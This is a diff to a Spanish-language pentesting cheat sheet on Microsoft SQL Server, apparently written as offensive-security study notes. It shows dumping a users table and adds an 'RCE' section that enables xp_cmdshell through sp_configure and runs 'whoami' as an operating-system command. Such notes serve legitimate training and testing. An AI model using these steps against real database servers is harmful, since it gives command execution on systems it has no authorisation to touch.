@@ -27,3 +27,26 @@ Usualmente usa los puertos tcp/1433 y UDP/1434
 ### Dumpear una tabla
 
     select * from offsec.dbo.users;
+
+---
+
+# RCE
+
+### 1)Iniciamos el advanced mode
+
+    EXECUTE sp_configure 'show advanced options', 1;
+
+### 2)Reconfiguramos
+
+    RECONFIGURE;
+
+### 3)Configuramos el xp_cmdshell
+
+    EXECUTE sp_configure 'xp_cmdshell', 1;
+
+### 4)Recondiguramos
+
+    RECONFIGURE;
+### 5) ejecutamos
+
+    EXECUTE xp_cmdshell 'whoami';
